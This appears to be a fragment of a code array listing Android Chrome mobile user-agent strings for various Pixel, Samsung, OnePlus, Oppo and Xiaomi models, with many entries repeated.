'Mozilla/5.0 (Linux; Android 12; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; CPH2411) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 23049RAD8C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; DN2103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2109119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2481) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36',
